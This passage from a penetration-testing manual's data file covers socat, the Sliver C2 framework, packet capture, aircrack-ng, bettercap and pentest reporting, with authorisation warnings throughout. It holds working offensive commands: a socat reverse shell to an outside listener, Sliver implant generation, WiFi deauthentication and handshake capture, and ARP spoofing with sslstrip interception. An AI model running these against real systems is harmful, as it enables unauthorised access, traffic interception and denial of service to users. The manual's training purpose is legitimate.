  syntax:'socat TCP-LISTEN:4444,reuseaddr,fork TCP:127.0.0.1:8080\nsocat -d -d TCP-LISTEN:5353,fork UDP:8.8.8.8:53',
  flags:[
    {f:'TCP-LISTEN:8080,fork,reuseaddr', d:'Listen on a port and keep serving: the standard relay form.'},
    {f:'TCP:10.10.20.5:80', d:'Connect forward to an internal host and port.'},
    {f:'EXEC:/bin/bash,pty,stderr,setsid,sigint,sane', d:'Bind a PTY to bash. The full-TTY upgrade recipe.'},
    {f:'FILE:/tmp/data,create', d:'Use a file as an address — write payloads, read output, bridge files to sockets.'},
    {f:'exec:,pty,raw,echo=0 / OPEN:', d:'Terminal handling for a usable interactive shell.'},
    {f:'UDP4-RECVFROM / UDP4-SENDTO', d:'UDP relaying, which proxychains cannot do.'},
    {f:'-d -d', d:'Verbose diagnostics. Two -d for more. Use when a relay silently fails.'},
    {f:'-t TIMEOUT / -T TIMEOUT', d:'Read/write timeouts — necessary for relays that must clean themselves up.'}
  ],
  examples:[
    { cmd:`# Full TTY upgrade — attacker side`, note:'socat file:$(tty),raw,echo=0 tcp-listen:4444' },
    { cmd:`# Full TTY upgrade — target side`, note:'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:10.10.14.9:4444' },
    { cmd:`socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.20.5:80`, note:'Simple single-port forwarding through a pivot with no socat-based tooling.' },
    { cmd:`socat UDP4-LISTEN:161,fork UDP4:10.10.20.5:161`, note:'UDP relay — the thing SOCKS-based pivoting cannot do.' },
    { cmd:`socat TCP-LISTEN:4433,reuseaddr,fork EXEC:/opt/app/shell-wrapper`, note:'Attach a listener to a command. Useful in constrained environments.' }
  ],
  opsec:['Port relays on a compromised host mean an open listener on the client\'s network. Forget to kill it and you have left a permanent hole in their perimeter. Track every listener you create and remove them all at debrief.','socat on the target is a common and heavily-detected pentest artefact. Prefer ligolo-ng or chisel when you need anything more than a one-off.'],
  tips:['The TTY upgrade recipe is worth memorising outright: a dumb shell cannot run sudo, ssh, or interactive tools, and a fully interactive shell changes what is possible on a box. socat is the most reliable way to get there.','Alternatives worth knowing for the same job: the classic python3 -c \'pty.spawn("/bin/bash")\' and script -qc /bin/bash /dev/null.'],
  links:[{t:'socat manual', u:'https://www.dest-unreach.org/socat/doc/socat.html'},{t:'Reverse shell cheat sheet', u:'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md'}],
  related:['t-nc','t-chisel','t-proxychains','t-ligolo'] },

{ id:'t-sliver', name:'Sliver', kind:'suite', phases:['MASTERY'],
  pkg:'GitHub releases / go install', tagline:'A modern C2 framework: mTLS/WireGuard/HTTP(S) implants, multi-operator, scriptable via gRPC.',
  what:'An open-source command-and-control framework positioned as the modern alternative to Metasploit\'s meterpreter. It generates implants per-operation, supports mTLS, WireGuard, HTTPS and DNS transports, gives multiple operators a shared server, and exposes a full gRPC API so agents can be driven programmatically.',
  syntax:'sliver-server   →   generate --mtls HOST --os windows --save       →   mtls / sessions / use ID',
  flags:[
    {f:'generate', d:'Build an implant. Flags: --mtls (address), --http, --wg, --dns, --os, --arch, --save, --name.'},
    {f:'mtls / https / wg / dns', d:'Start the corresponding listener.'},
    {f:'sessions / beacons / use', d:'List and interact with interactive sessions and asynchronous beacons.'},
    {f:'Beacons', d:'Check-in on an interval with jitter — some EDR/NDR detection still catches short-interval beacons, but this is far quieter than a persistent session.'},
    {f:'--canary / --evasion', d:'Canary domains (detect sandbox/interception) and evasion features.'},
    {f:'Armory', d:'Bundle manager for extensions: BOFs (beacon object files), .NET assemblies, aliases. How you add capabilities like a Rubeus or Seatbelt integration.'},
    {f:'wg-port-forward / socks5', d:'Built-in pivoting: SOCKS5 proxies and port forwards from within the framework.'},
    {f:'gRPC + sliver-client', d:'Multiplayer mode. The server can be shared, and everything is API-accessible — this is how automated operation works.'},
    {f:'profiles / implants', d:'Reusable implant configurations and per-target builds, so you do not hand-configure every time.'}
  ],
  examples:[
    { cmd:`sliver-server`, note:'Start the server. Then sliver-client to connect (locally or over the network).' },
    { cmd:`generate --mtls 10.10.14.9 --os linux --arch amd64 --save /tmp/implants/`, note:'Build a Linux implant. Note it is generated per operation, so each engagement gets unique binaries.' },
    { cmd:`mtls --lport 8888`, note:'Start the matching mTLS listener.' },
    { cmd:`sessions && use 5a2b...`, note:'Interact with the session. Then ps, ls, download, upload, socks5 start.' },
    { cmd:`make-bof -t /path/to/Seatbelt -o seatbelt.o`, note:'Compile a BOF for in-memory execution within the implant process.' }
  ],
  opsec:['A C2 framework is a serious capability. Running one requires explicit written authorisation naming the tool and the infrastructure, and the client must know what a C2 looks like on their network so they do not treat it as a real incident.','Your C2 infrastructure is now part of the engagement: it must be under your control, logged, and destroyed afterwards. Redirectors and domain-ageing are operational security concerns that get people caught out.'],
  tips:['Sliver is the right teaching answer to "what comes after meterpreter". Understand beaconing, jitter, and the detection trade-offs — that conceptual layer is what separates an operator from a tool user.','Know the landscape: Sliver, Cobalt Strike (commercial, the industry default), Havoc, Mythic, Brute Ratel. Understanding the category matters more than any single tool.'],
  links:[{t:'Sliver on GitHub', u:'https://github.com/BishopFox/sliver'},{t:'Sliver docs', u:'https://sliver.sh/docs'}],
  related:['t-metasploit','t-msfvenom','t-windows-privesc-doc'] },

{ id:'t-wireshark', name:'Wireshark / tcpdump', kind:'tool', phases:['FOUNDATION','RECON','POST','MASTERY'],
  pkg:'apt install wireshark tcpdump', tagline:'See the actual bytes. The tool that separates understanding from assuming.',
  what:'Packet capture and analysis. tcpdump for capture on a host (including on a doomed box, where you have no GUI), Wireshark for analysis: follow streams, decode protocols, extract objects, and see exactly what a tool or a service is doing on the wire.',
  syntax:'sudo tcpdump -i eth0 -w capture.pcap \'tcp port 445\'\nwireshark capture.pcap',
  flags:[
    {f:'-i / -i any', d:'Interface. any captures across all interfaces and catches things you would otherwise miss.'},
    {f:'-w / -r', d:'Write to pcap / read from pcap.'},
    {f:'BPF filter', d:'host 10.10.10.5, port 445, tcp and not port 22, net 10.10.20.0/24. Learn these — they cut noise enormously.'},
    {f:'-A / -X / -e', d:'ASCII, hex+ASCII, and link-layer headers in the terminal. -A for passwords in plaintext protocols.'},
    {f:'-c N / -s 0', d:'Stop after N packets / capture full packets (modern tcpdump defaults to full length; older versions truncate).'},
    {f:'-nn', d:'No DNS, no port-name resolution. Faster and clearer.'},
    {f:'wireshark filters', d:'http.request.method=="POST", tcp.flags.syn==1, tls.handshake, smb2, dns, !arp. Different syntax from BPF — both are worth knowing.'},
    {f:'Statistics / Follow / Export', d:'Conversation and protocol hierarchy views; Follow TCP/TLS stream; Export Objects for extracting transferred files.'},
    {f:'tshark', d:'The CLI. tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri. Scriptable dissection.'}
  ],
  examples:[
    { cmd:`sudo tcpdump -i any -nn -A 'tcp port 21' -w ftp.pcap`, note:'Capture FTP traffic — plaintext credentials and all.' },
    { cmd:`sudo tcpdump -i eth0 -nn -w /dev/shm/cap.pcap 'not port 22 and not arp'`, note:'On a foothold: capture into memory, excluding your own SSH noise.' },
    { cmd:`tshark -r cap.pcap -Y 'http.request.method == "POST"' -T fields -e ip.src -e http.host -e http.request.uri`, note:'Extract every POST from a capture. Excellent for finding credential submissions.' },
    { cmd:`tshark -r cap.pcap -Y 'tls.handshake.type == 11' -T fields -e tls.handshake.extensions_server_name`, note:'Pull SNI hostnames out of a capture — effectively DNS-over-TLS discovery.' },
    { cmd:`# Wireshark GUI`, note:'Statistics → Protocol Hierarchy to orient, then Filter to drill in, then Follow → TCP Stream to read a conversation in order.' }
  ],
  opsec:['Capturing on a switch port only shows traffic to and from your own host, plus broadcasts. Capturing another network\'s traffic requires a span port, a tap, or an attack (ARP spoofing) — each with its own authorisation requirement.','pcaps routinely contain credentials, tokens and personal data. Handle them as engagement evidence: encrypted at rest, destroyed at close.'],
  tips:['When a tool is "not working", capture and look. Is the SYN leaving? Is a RST coming back? Is a proxy rewriting the request? Five minutes with tcpdump resolves most mysteries that produce hours of guessing.','Learn both filter languages. BPF for capture (so you do not fill a disk), Wireshark display filters for analysis (so you do not drown).'],
  links:[{t:'Wireshark display filter reference', u:'https://www.wireshark.org/docs/dfref/'},{t:'tcpdump man page', u:'https://www.tcpdump.org/manpages/tcpdump.1.html'}],
  related:['t-bettercap','t-responder','t-aircrack'] },

{ id:'t-aircrack', name:'aircrack-ng suite', kind:'suite', phases:['MASTERY'],
  pkg:'preinstalled on Kali/Parrot', tagline:'The wireless toolkit: monitor mode, capture, deauth, handshake cracking, PMKID.',
  what:'A suite for 802.11 testing: airmon-ng puts a card into monitor mode, airodump-ng captures traffic and handshakes, aireplay-ng injects (deauth, etc.), and aircrack-ng cracks the captured material offline. It works with WPA/WPA2 (handshake or PMKID) and old WEP.',
  syntax:'airmon-ng start wlan0 → airodump-ng wlan0mon → aireplay-ng --deauth → aircrack-ng cap.cap -w list',
  flags:[
    {f:'airmon-ng start/stop', d:'Monitor mode on/off. Use check kill to stop interfering processes (NetworkManager) first.'},
    {f:'airodump-ng -c CH -w out wlan0mon', d:'Capture on a channel, writing out-01.cap. Omit -c to survey all channels and see what is out there.'},
    {f:'airodump-ng --bssid MAC --wps', d:'Focus on one AP; show WPS status (frequently enabled and weak).'},
    {f:'aireplay-ng --deauth 10 -a AP -c CLIENT', d:'Send deauth frames to force a handshake capture. Intrusive and disruptive: it disconnects real users.'},
    {f:'aircrack-ng -w LIST cap.cap', d:'Offline crack of the captured handshake.'},
    {f:'-e / -b', d:'Filter by ESSID / BSSID.'},
    {f:'PMKID', d:'Modern approach: capture the PMKID from a single frame (hcxdumptool / hcxtools) with no deauth and no connected client — much quieter.'},
    {f:'WPA3 / SAE', d:'Not crackable by handshake capture in the same way. Know the limit before you promise a result.'}
  ],
  examples:[
    { cmd:`sudo airmon-ng check kill && sudo airmon-ng start wlan0`, note:'Prepare the adapter. Kill NetworkManager or it fights you for the interface.' },
    { cmd:`sudo airodump-ng wlan0mon`, note:'Survey: which APs, channels, encryption types, clients. Write down your target BSSID and channel.' },
    { cmd:`sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon`, note:'Targeted capture. Wait for "WPA handshake" in the top-right corner.' },
    { cmd:`sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon`, note:'Force a reconnect to capture the handshake. Five frames; more is antisocial and unnecessary.' },
    { cmd:`sudo hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1 && hcxpcapngtool -o hash.hc22000 dump.pcapng`, note:'PMKID capture with no client and no deauth. Then hashcat -m 22000.' }
  ],
  opsec:['Deauthentication attacks disconnect real people from real networks. That is a denial-of-service against users and needs explicit authorisation, and it is illegal without it.','Capturing wireless traffic means capturing data from devices that may not be owned by your client (staff personal phones, neighbours\' traffic). Scope it at the network level, not the device level.','Wireless testing in most jurisdictions is separately legislated from network testing. Written authorisation must name the frequencies and the networks explicitly.'],
  tips:['Modern practice has moved on from deauth-driven handshake capture: PMKID capture (hcxdumptool) gets the same crackable material from a single frame with no disruption at all. Learn that first.','A weak PSK is the difference between hours of work and no result. Check the client\'s password policy before promising an outcome — and report the policy gap as a finding.'],
  links:[{t:'aircrack-ng.org', u:'https://www.aircrack-ng.org/'},{t:'hcxtools (PMKID)', u:'https://github.com/ZerBea/hcxtools'}],
  related:['t-bettercap','t-wireshark','t-hashcat'] },

{ id:'t-bettercap', name:'bettercap', kind:'suite', phases:['FOUNDATION','MASTERY'],
  pkg:'apt install bettercap', tagline:'Modern MITM framework: ARP/NDP spoofing, sniffing, HTTP(S) interception, BLE and WiFi recon.',
  what:'A Swiss-army framework for layer-2 attacks with a proper interactive console and a web UI. Handles ARP spoofing, NDP spoofing (IPv6), DNS spoofing, credential sniffing (many plaintext and hash protocols), caplet scripting, and sniffing of HTTP, HTTPS (with its own CA), WiFi and BLE.',
  syntax:'sudo bettercap -iface eth0   →   net.probe on; set arp.spoof.targets IP; arp.spoof on; net.sniff on',
  flags:[
    {f:'net.probe on / net.show', d:'Discover hosts on the LAN, then list them. The first two commands of any LAN assessment.'},
    {f:'arp.spoof.targets / arp.spoof on', d:'Poison ARP to become the man in the middle for chosen targets.'},
    {f:'net.sniff on / net.sniff.output', d:'Sniff and analyse traffic, optionally writing a pcap. It parses credentials out of many protocols for you.'},
    {f:'http.proxy on / https.proxy on', d:'Intercept HTTP(S). The HTTPS proxy uses bettercap\'s own CA (install it from /caplets or the http-ui).'},
    {f:'dns.spoof / dhcp6.spoof + dns.spoof', d:'DNS answer spoofing; the IPv6 pair is the modern equivalent when IPv4 ARP is protected.'},
    {f:'caplets', d:'Scripted modules (http-ui, https-ui, wifi, ble). These are where the framework becomes genuinely powerful.'},
    {f:'wifi.recon / ble.recon', d:'WiFi and Bluetooth Low Energy reconnaissance from the same console.'},
    {f:'set <module>.<option>', d:'Universal option setter. Tab completion is excellent — explore.'},
    {f:'-caplet FILE / events.stream', d:'Run a caplet script / stream events to the console.'}
  ],
  examples:[
    { cmd:`sudo bettercap -iface eth0 -caplet http-ui`, note:'Web UI for monitoring. The most usable way to run it.' },
    { cmd:`# In the console`, note:'net.probe on; net.show' },
    { cmd:`# ARP MITM with sniffing`, note:'set arp.spoof.targets 10.10.10.20; arp.spoof on; set net.sniff.verbose true; net.sniff on' },
    { cmd:`# HTTPS interception`, note:'https.proxy on; set https.proxy.sslstrip true' }
  ],
  opsec:['ARP spoofing is a denial-of-service against the targeted hosts by design: their traffic goes through you, and if you stop, their connections break. On a production network this can be an outage, especially with duplicate-IP warnings from network monitoring.','This is one of the most intrusive things in this manual. Written authorisation naming the technique and the specific hosts is essential.'],
  tips:['Underused capability: bettercap\'s wifi and ble modules are a clean way to do passive wireless/BLE reconnaissance without leaving the same console.','Compare with Responder on the same network. They overlap, but Responder answers name resolution while bettercap takes over the whole path. Knowing which is the right tool for the finding matters.'],
  links:[{t:'bettercap.org', u:'https://www.bettercap.org/'},{t:'BetterCAP docs', u:'https://www.bettercap.org/usage/'}],
  related:['t-responder','t-wireshark','t-aircrack'] },

{ id:'t-markdown', name:'Reporting (markdown → PDF/DOCX)', kind:'reference', phases:['MASTERY'],
  pkg:'pandoc via apt', tagline:'The deliverable is the report. Evidence, findings, risk rating, reproduction steps, remediation.',
  what:'A penetration test is only worth what its report communicates. This entry covers the toolchain (markdown to PDF/DOCX with pandoc) and, more importantly, the structure: what each finding needs so an engineer can reproduce it and a manager can prioritise it.',
  syntax:'pandoc report.md -o report.pdf --pdf-engine=xelatex --toc\npandoc report.md -o report.docx',
  flags:[
    {f:'Title / severity / affected systems', d:'Every finding opens with these three. An engineer needs the asset; a manager needs the severity.'},
    {f:'Description', d:'What the issue is, in plain language, jargon-free. Assume the reader is competent but not an expert.'},
    {f:'Evidence', d:'The exact command and its output, plus a screenshot. "Reproducible by pasting this one command" is the standard to aim for.'},
    {f:'Impact', d:'What an attacker actually gets. Not "this is bad" but "an unauthenticated attacker can read every customer record".'},
    {f:'Remediation', d:'Specific and actionable: the config line, the version to patch, the ACL to fix. "Improve security" is not remediation.'},
    {f:'References', d:'CVE, vendor advisory, CWE ID, and any standard framework (OWASP, CIS).'},
    {f:'Risk rating', d:'Use CVSS and state the version, plus your own contextual severity. Explain any divergence.'},
    {f:'Executive summary', d:'One page, no jargon, written for the person signing the invoice. This is the page that decides whether the work is valued.'},
    {f:'Appendix', d:'Scope, methodology, tool versions, full scan output, credential-handling note, and the destruction certificate date.'}
  ],
  examples:[
    { cmd:`mkdir -p ~/engagements/acme/report/{evidence,findings} && cd ~/engagements/acme`, note:'Structure the report directory before you start writing.' },
    { cmd:`pandoc report.md -o acme-report.pdf --pdf-engine=xelatex --toc --number-sections -V geometry:margin=2cm`, note:'Markdown to a properly numbered PDF.' },
    { cmd:`# Finding template`, note:'## Finding 01 — SQL injection in /item?id=  |  Severity: Critical (CVSS 9.8)  |  Affected: https://app.example.com/item  |  ... ' },
    { cmd:`grep -c '^## Finding' report.md`, note:'Sanity check the finding count against your notes before delivery.' }
  ],
  opsec:['Client data in your report is client data: encrypted at rest, delivered over an agreed channel, destroyed on the agreed date with a certificate.','Tool output pasted wholesale into a report looks rushed and buries the finding. Extract the minimum that proves the point.'],
  tips:['Write findings as you go, not at the end. You will not remember the request that proved the IDOR three weeks later, and reconstructing it costs hours.','Every critical finding needs a manually-reproducible one-liner (curl, or a single tool command). That is what makes a report credible rather than a scanner dump.'],
  links:[{t:'pandoc', u:'https://pandoc.org/MANUAL.html'},{t:'CVSS v3.1 calculator', u:'https://www.first.org/cvss/calculator/3.1'},{t:'OWASP WSTG', u:'https://owasp.org/www-project-web-security-testing-guide/'}],
  related:['t-legal','t-burp','t-nmap'] }

);
